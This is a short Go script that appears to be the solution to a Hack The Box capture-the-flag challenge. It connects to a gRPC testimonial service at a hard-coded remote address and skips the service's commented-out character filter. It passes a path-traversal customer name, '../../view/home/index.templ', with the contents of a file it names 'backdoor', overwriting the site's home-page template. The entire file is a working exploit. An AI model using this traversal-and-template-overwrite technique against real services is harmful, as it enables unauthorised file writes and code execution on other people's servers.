package main

import (
	"context"
	"fmt"
	"htbchal/pb"
	"sync"
	"io/ioutil"

	"google.golang.org/grpc"
)

var (
	grpcClient *Client
	mutex      *sync.Mutex
)

func init() {
	grpcClient = nil
	mutex = &sync.Mutex{}
}

type Client struct {
	pb.RickyServiceClient
}

func GetClient() (*Client, error) {
	mutex.Lock()
	defer mutex.Unlock()

	if grpcClient == nil {
		// conn, err := grpc.Dial(fmt.Sprintf("127.0.0.1%s", ":50045"), grpc.WithInsecure())
		conn, err := grpc.Dial(fmt.Sprintf("94.237.63.46%s", ":31438"), grpc.WithInsecure())
		if err != nil {
			return nil, err
		}

		grpcClient = &Client{pb.NewRickyServiceClient(conn)}
	}

	return grpcClient, nil
}

func (c *Client) SendTestimonial(customer, testimonial string) error {
	ctx := context.Background()
	// Filter bad characters.
	// for _, char := range []string{"/", "\\", ":", "*", "?", "\"", "<", ">", "|", "."} {
	// 	customer = strings.ReplaceAll(customer, char, "")
	// }

	_, err := c.SubmitTestimonial(ctx, &pb.TestimonialSubmission{Customer: customer, Testimonial: testimonial})
	return err
}

func main () {
	client, _ := GetClient()

	backdoor, _ := ioutil.ReadFile("./solve.templ")

	client.SendTestimonial("../../view/home/index.templ", string(backdoor))
}
